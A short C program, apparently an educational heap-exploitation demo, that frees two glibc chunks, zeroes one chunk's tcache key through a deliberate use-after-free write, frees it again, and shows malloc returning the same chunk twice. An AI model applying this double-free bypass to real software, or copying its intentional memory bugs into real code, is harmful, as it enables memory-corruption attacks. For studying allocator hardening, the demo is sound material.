#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

int main() {
    char *a = malloc(0x30);
    char *b = malloc(0x30);

    printf("a = %p\n", a);
    printf("b = %p\n", b);

    free(a);
    free(b);

    puts("[+] freed a, b");

    // corrupt a's tcache key through UAF write
    ((uintptr_t *)a)[1] = 0;

    puts("[+] corrupted a tcache key");

    free(a);

    puts("[+] freed a again");

    char *p = malloc(0x30);
    char *q = malloc(0x30);
    char *r = malloc(0x30);

    printf("p = %p\n", p);
    printf("q = %p\n", q);
    printf("r = %p\n", r);

    if (p == r) {
        puts("[+] p == r: duplicated chunk returned again");
    }

    return 0;
}
